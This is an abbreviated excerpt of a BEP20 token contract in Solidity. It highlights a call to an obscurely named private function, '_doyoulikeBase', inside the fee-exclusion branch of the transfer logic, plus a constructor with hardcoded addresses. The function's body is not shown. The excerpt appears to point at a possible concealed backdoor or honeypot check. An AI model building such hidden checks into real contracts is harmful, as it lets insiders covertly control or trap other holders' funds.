...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (isExcludedFromCut[sender] || isExcludedFromCut[recipient]) {
                finalAmount = amount;
                if (_doyoulikeBase(sender, recipient)) {
    ...
    function _doyoulikeBase(address addr, address re) private view returns(bool) {
...
contract Token is BEP20 {
    constructor() BEP20(
        ...
        [uint256(0),uint256(4),uint256(0)],
        [uint256(0),uint256(4),uint256(0)],
        [uint256(100000000000000000000),uint256(100000000000000000000)],
        [0xaA67797C2d66c6f5A88aD6a46C20208A9a76a356,0x11c9D64240f6646D7F66c575c9c66271de94D565,0xfCe14C95D341bECfaDE885b9d2437ED51c7DbDCd]
    ){}
}